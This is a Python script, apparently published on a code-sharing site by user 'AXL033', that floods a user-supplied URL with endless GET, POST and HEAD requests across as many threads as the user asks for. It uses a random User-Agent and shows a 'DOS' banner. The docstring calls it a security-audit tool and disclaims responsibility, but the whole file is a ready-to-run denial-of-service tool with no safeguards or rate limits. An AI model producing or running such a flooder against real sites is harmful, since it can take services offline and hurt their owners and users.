#!/usr/bin/env python

import grequests
import subprocess
from typing import *
from threading import Thread
from rich.console import Console
from fake_useragent import UserAgent

"""
This script was created by user AXL033.
This script is not a hacking tool, but a tool for
security testing audit. Please do not try to load
other people's sites without proper permission.
In any case I am not responsible for your actions
with this script, I publish it only to show how it works.
If you have any ideas, questions or errors while using the script,
send me a message on Telegram: @axl033
"""

class Main:

    def __init__(self) -> None:
        self.console: object = Console() # Creating console object
        self.UserAgent: str = UserAgent().random # Creating random UA

        # Calling other methods
        self.clearConsole() # Clear console
        self.printLogo() # Printing LogoText
        self.gettingData() # Getting the Data
        self.checkingData() # Checking the Data

    def printLogo(self) -> None:
        # LogoText
        self.console.print("""[magenta]
        ██████╗░░█████╗░░██████╗
        ██╔══██╗██╔══██╗██╔════╝
        ██║░░██║██║░░██║╚█████╗░
        ██║░░██║██║░░██║░╚═══██╗
        ██████╔╝╚█████╔╝██████╔╝
        ╚═════╝░░╚════╝░╚═════╝░[/magenta]
        """, justify="center")
        # Additional Informations
        self.console.rule("[bold green underline]Additional Informations[/bold green underline]")
        self.console.print("[bold][green][+][/green] This script was developed by user [magenta underline]AXL033[/magenta underline][/bold]")
        self.console.print("[bold][green][+][/green] I am not responsible for your actions with this script[/bold]")
        self.console.print("[bold][green][+][/green] If you have any questions or problems contact me on [underline magenta]Telegram: @axl033[/underline magenta][/bold]")
        self.console.rule("[bold green underline]Getting Started[/bold green underline]")

    def gettingData(self) -> None:
        self.url: List[str] = [self.console.input("[bold][yellow][?][/yellow] Please provide a link: [/bold]")] # Getting URL from user
        self.threads: Any = self.console.input("[bold][yellow][?][/yellow] Please specify the number of threads: [/bold]") # Getting threads count

    def checkingData(self) -> None:
        if "http" not in self.url[0]: # Checking http in URL
            self.console.print("[bold red underline][!] Please enter the correct URL![/bold red underline]") # Error
            exit()
        else:
            try: # Trying to convert data type
                self.threads: Any = int(self.threads)
                self.start() # Starting stress test
            except:
                self.console.print("[bold red underline][!] Please enter the correct number of threads![/bold red underline]")
                exit()

    def flood(self) -> None:
        # Starting infinite cycle send requests
        while True:
            # Queries with Gevent
            print(grequests.map((grequests.get(u, headers={"User-Agent": self.UserAgent}) for u in self.url)))
            print(grequests.map((grequests.post(u, headers={"User-Agent": self.UserAgent}) for u in self.url)))
            print(grequests.map((grequests.head(u, headers={"User-Agent": self.UserAgent}) for u in self.url)))

    def start(self) -> None:
        for _ in range(self.threads):
            Thread(target=self.flood).start()
            self.console.print(f"[bold][red][+][/red] Thread of {_} is started![/bold]\n")

    def clearConsole(self) -> None:
        try:
            subprocess.call(["cls"], shell=1) # Clear windows console
        except:
            subprocess.call(["clear"], shell=1) # Clear Linux, Termux, Mac OS console


if __name__ == "__main__":
    Main()